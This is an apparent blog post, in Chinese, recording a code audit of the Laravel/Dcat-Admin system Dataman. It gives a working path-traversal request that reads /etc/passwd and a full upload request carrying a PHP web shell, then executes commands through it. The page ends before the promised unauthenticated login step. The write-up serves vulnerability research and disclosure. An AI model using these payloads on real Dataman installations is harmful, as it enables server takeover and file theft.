@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>对 Dataman 的代码审计分析 | 末心的小博客</title><meta name="author" content="末心"><meta name="copyright" content="末心"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="把 Dataman 这套基于 Laravel 8 与 Dcat-Admin 的数据管理系统拉到本地跑起来审了一遍。从默认口令进后台，到通过媒体上传接口在服务器上执行命令，整条链不需要任何账号。记录审计过程、判断依据，以及两个差点误判的地方。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对 Dataman 的代码审计分析">
+<meta property="og:url" content="https://moxin1044.github.io/posts/a1b2/index.html">
+<meta property="og:site_name" content="末心的小博客">
+<meta property="og:description" content="把 Dataman 这套基于 Laravel 8 与 Dcat-Admin 的数据管理系统拉到本地跑起来审了一遍。从默认口令进后台，到通过媒体上传接口在服务器上执行命令，整条链不需要任何账号。记录审计过程、判断依据，以及两个差点误判的地方。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://moxin1044.github.io/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png">
+<meta property="article:published_time" content="2026-10-16T13:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-15T20:35:21.946Z">
+<meta property="article:author" content="末心">
+<meta property="article:tag" content="Dcat-Admin">
+<meta property="article:tag" content="Laravel">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="路径穿越">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://moxin1044.github.io/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "对 Dataman 的代码审计分析",
+  "url": "https://moxin1044.github.io/posts/a1b2/",
+  "image": "https://moxin1044.github.io/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png",
+  "datePublished": "2026-10-16T13:00:00.000Z",
+  "dateModified": "2026-10-15T20:35:21.946Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "末心",
+      "url": "https://moxin1044.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://q1.qlogo.cn/g?b=qq&amp;nk=1044631097&amp;s=640"><link rel="canonical" href="https://moxin1044.github.io/posts/a1b2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '对 Dataman 的代码审计分析',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><script src="/js/lolia.js"></script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="末心的小博客" type="application/atom+xml">
+</head><body><div id="web_bg" style="background: linear-gradient(135deg, #eef4fc 0%, #e8eef8 48%, #eae6f6 100%);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=1044631097&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">93</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">104</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">42</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">末心的小博客</span></a><a class="nav-page-title" href="/"><span class="site-name">对 Dataman 的代码审计分析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">对 Dataman 的代码审计分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-16T13:00:00.000Z" title="发表于 2026-10-16 21:00:00">2026-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-15T20:35:21.946Z" title="更新于 2026-10-16 04:35:21">2026-10-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png);"></div><article class="container post-content" id="article-container"><p>Dataman 是一个开源的数据管理系统，README 里写得很克制：轻量、现代设计风格、移动端。功能清单列了二十来项，从配置管理到广告位，看得出是认真做的项目。技术栈是 Laravel 8 加 Dcat-Admin，代码量不大，一百五十个 PHP 文件、九千行左右。</p>
+<p>我把它拉到本地跑起来审了一遍。结论不太好看：从打开登录页，到在服务器上执行系统命令，全程不需要任何已有的账号。</p>
+<p>这篇文章记录审计过程。漏洞本身在报告里有逐条列出，这里更想讲的是怎么找到的、怎么判断的，以及中途两次差点把洞放过去的地方。</p>
+<h2 id="一、先摸清攻击面"><a href="#一、先摸清攻击面" class="headerlink" title="一、先摸清攻击面"></a>一、先摸清攻击面</h2><p>拿到一个 Web 项目，第一步不是搜 <code>eval</code>，是先搞清楚它长什么样：用什么框架、路由怎么组织、哪些入口不需要登录。</p>
+<p>Dataman 的框架信息在 <code>composer.json</code> 里：</p>
+<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">"require"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"dcat/laravel-admin"</span><span class="punctuation">:</span> <span class="string">"2.*"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"laravel/framework"</span><span class="punctuation">:</span> <span class="string">"^8.12"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"guzzlehttp/guzzle"</span><span class="punctuation">:</span> <span class="string">"^7.0.1"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"laravel/tinker"</span><span class="punctuation">:</span> <span class="string">"^2.5"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
+<p>Laravel 8 加 Dcat-Admin 2.x。项目自己的路由分两块，<code>routes/api.php</code> 里是给移动端用的接口，<code>routes/web.php</code> 是后台。</p>
+<p>真正值得盯的是 <code>routes/api.php</code> 里的这一段：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">prefix</span>(<span class="string">'v1'</span>)-&gt;<span class="title function_ invoke__">group</span>(function () {</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">'/layouts'</span>, [<span class="title class_">ChannelController</span>::<span class="variable language_">class</span>, <span class="string">'layout'</span>]);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">'/region/china'</span>, [<span class="title class_">ChinaRegionController</span>::<span class="variable language_">class</span>, <span class="string">'show'</span>]);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+<p>这个路由组上没挂任何鉴权中间件。后台路由全都在 <code>['web', 'admin']</code> 中间件组里，而这两个接口是裸露的。</p>
+<p>不过先别急着下结论。后台的路由虽然在中间件组里，但控制器构造函数里还能再挂，Dcat-Admin 和 Laravel 都习惯这么写，我见过不少项目是靠控制器里的 <code>$this-&gt;middleware('auth')</code> 兜底的。</p>
+<h2 id="二、汇点扫描很干净，但这不算好消息"><a href="#二、汇点扫描很干净，但这不算好消息" class="headerlink" title="二、汇点扫描很干净，但这不算好消息"></a>二、汇点扫描很干净，但这不算好消息</h2><p>第二步做汇点扫描，也就是直接搜危险函数，看用户输入有没有可能流进去。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -rnE <span class="string">'(DB::raw|whereRaw|selectRaw|orderByRaw|DB::statement)'</span> app/</span><br><span class="line">grep -rnE <span class="string">'\b(eval|assert|create_function)\s*\(|call_user_func'</span> app/</span><br><span class="line">grep -rnE <span class="string">'\bunserialize\s*\(|phar://'</span> app/</span><br><span class="line">grep -rnE <span class="string">'\b(exec|shell_exec|system|passthru|popen|proc_open)\s*\('</span> app/</span><br><span class="line">grep -rnE <span class="string">'\b(file_put_contents|file_get_contents|fopen|unlink|rename|copy|mkdir)\s*\('</span> app/</span><br></pre></td></tr></tbody></table></figure>
+<p>结果很干净。原始 SQL 只有一处，是安装时导入 <code>install.sql</code> 用的。代码执行、反序列化、命令执行一个都没有。文件操作只有两处，一处在安装器里读 <code>composer.json</code>，一处在 <code>MediaController</code> 里读媒体文件。</p>
+<p>这里有个判断要说清楚：<strong>汇点干净不等于没有漏洞。</strong></p>
+<p>Laravel 这类框架把危险操作包得很深。SQL 走 ORM 之后天然参数化，文件操作被 <code>Storage</code> 抽走，命令执行基本不会出现在业务代码里。真正的高频漏洞搬了家，跑到逻辑层面去了：谁能访问哪个接口、上传的文件是什么类型、模板有没有转义、配置项有没有关掉。</p>
+<p>所以扫描只能排除掉一类情况，告诉你「不是那种一眼可见的洞」。接下来得换个方向找。</p>
+<h2 id="三、盯住用户输入流向文件系统的那一处"><a href="#三、盯住用户输入流向文件系统的那一处" class="headerlink" title="三、盯住用户输入流向文件系统的那一处"></a>三、盯住用户输入流向文件系统的那一处</h2><p>换个问法：用户能控制的数据，最后会到达哪里？</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">'request()-&gt;\|\$request-&gt;get(\|\$request-&gt;input(\|Input::'</span> app/ | grep -v vendor/</span><br></pre></td></tr></tbody></table></figure>
+<p>把所有从请求里取值的地方列出来，逐个往后追，看它最终被送进什么函数。</p>
+<p>追完的结论是：整份代码里，用户输入与文件系统之间只有一条通路，就是媒体管理模块 <code>MediaController</code>。列表、下载、上传、删除、移动、建目录，六个动作全部把请求参数直接交给了 <code>MediaService</code>。</p>
+<p>攻击面收窄到这一个文件上了。Dataman 的六个漏洞，有四个出在这里。</p>
+<h2 id="四、任意文件读取：路径穿越的层级要数清楚"><a href="#四、任意文件读取：路径穿越的层级要数清楚" class="headerlink" title="四、任意文件读取：路径穿越的层级要数清楚"></a>四、任意文件读取：路径穿越的层级要数清楚</h2><p>先看下载接口。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Admin/Controllers/MediaController.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">'file'</span>);</span><br><span class="line">    <span class="variable">$manager</span> = <span class="keyword">new</span> <span class="title class_">MediaService</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">download</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>请求参数 <code>file</code> 没有经过任何校验，直接传给了 <code>MediaService</code>：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Services/MediaService.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFullPath</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;storage-&gt;<span class="title function_ invoke__">getDriver</span>()-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">applyPathPrefix</span>(<span class="variable">$path</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$fullPath</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFullPath</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">File</span>::<span class="title function_ invoke__">isFile</span>(<span class="variable">$fullPath</span>)) {</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">download</span>(<span class="variable">$fullPath</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">response</span>(<span class="string">''</span>, <span class="number">404</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><code>applyPathPrefix()</code> 做的事是「存储根目录」加「传入路径」的字符串拼接，它不对 <code>../</code> 做任何归一化。所以只要路径里有足够的 <code>..</code>，就能一路跳出存储目录。</p>
+<p>这里我踩了个坑，值得单独说。</p>
+<p>Dataman 的上传盘配置是 <code>public</code>，根目录是 <code>storage/app/public</code>。我第一反应是数出五层，构造了五个 <code>..</code>：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/media/download?file=../../../../../etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></tbody></table></figure>
+<p>返回 404，零字节。换成编码变体、双写绕过，全是 404。如果就此收手，这一条会被当成「没有漏洞」写进报告。</p>
+<p>回过神重新数了一遍目录深度：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/storage/app/public</span><br><span class="line"> └─ var  └─ www  └─ html  └─ storage  └─ app  └─ public</span><br></pre></td></tr></tbody></table></figure>
+<p>从文件系统根到 <code>public</code> 一共六个组件，要退到根目录需要六个 <code>..</code>，我少给了一个，路径停在了 <code>/var</code>。</p>
+<p>改成六个之后：</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM3_任意文件读取.png" alt="图三　路径穿越读取容器内的 /etc/passwd"></p>
+<p>响应 1232 字节，<code>/etc/passwd</code> 全文。同法可以读任意可读文件。</p>
+<p>教训很直白：<strong>路径穿越的层级数错一级，表现是 404，和「没有漏洞」长得一模一样。</strong> 遇到这类接口，别信自己的心算，把目录结构写出来数。</p>
+<h2 id="五、上传接口：从任意文件上传到命令执行"><a href="#五、上传接口：从任意文件上传到命令执行" class="headerlink" title="五、上传接口：从任意文件上传到命令执行"></a>五、上传接口：从任意文件上传到命令执行</h2><p>再看上传。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Services/MediaService.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$files</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) {</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;storage-&gt;<span class="title function_ invoke__">putFileAs</span>(<span class="variable">$this</span>-&gt;path, <span class="variable">$file</span>, <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>());</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>三行代码，两个问题。<code>putFileAs()</code> 的第三个参数是文件名，这里用的是客户端提交的原始文件名 <code>getClientOriginalName()</code>，服务端不重命名。而且整段逻辑里没有任何扩展名或 MIME 校验。</p>
+<p>但「能上传任意扩展名」离「能执行」还差一步，这一步经常被跳过。得看三个条件能不能凑齐：</p>
+<p>第一，文件落在哪。上传盘是 <code>public</code>，根目录 <code>storage/app/public</code>。</p>
+<p>第二，这个目录能不能从 Web 访问。Dataman 的安装流程会执行 <code>storage:link</code>：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Console/Commands/Install.php:56</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>(<span class="string">'storage:link'</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p>它把 <code>public/storage</code> 软链到 <code>storage/app/public</code>，于是上传目录挂在 Web 根下面了。</p>
+<p>第三，Web 服务器会不会执行这个目录里的脚本。看 nginx 配置：</p>
+<figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> {</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> php-fpm:<span class="number">9000</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><code>location ~ \.php$</code> 是一条正则匹配，它对 <code>public</code> 目录下任何位置的 <code>.php</code> 文件都生效，不区分是不是软链进来的。三个条件凑齐了。</p>
+<p>验证一下。用一个 PHP 文件，把 Content-Type 伪装成图片：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/media/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">X-CSRF-TOKEN</span><span class="punctuation">: </span>&lt;会话 token&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----X</span><br><span class="line"></span><br><span class="line"><span class="language-php">------X</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">"files[]"</span>; filename=<span class="string">"poc_shell.php"</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"PWNED:"</span>; <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">"c"</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------X</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">"dir"</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">/</span></span><br><span class="line"><span class="language-php">------X--</span></span><br></pre></td></tr></tbody></table></figure>
+<p>返回 302，上传成功。文件落在容器里：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--  1 www-data www-data  52  /var/www/html/storage/app/public/poc_shell.php</span><br></pre></td></tr></tbody></table></figure>
+<p>然后直接访问它，不需要任何凭据：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/storage/poc_shell.php?c=id</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM4_命令执行.png" alt="图四　上传的 PHP 文件被服务器执行"></p>
+<p>输出是 <code>PWNED:uid=82(www-data) gid=82(www-data)</code>，再追加 <code>uname -a</code> 能拿到内核版本。到这里命令执行已经成立。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM7_媒体管理列表.png" alt="图七　媒体管理列表里能看到刚上传的文件"></p>
+<p>顺带说明一下这个接口的鉴权状态。它是后台路由，需要管理员登录，单看这一条不构成未授权。但配合下一个问题，整条链就不需要任何已有账号了。</p>
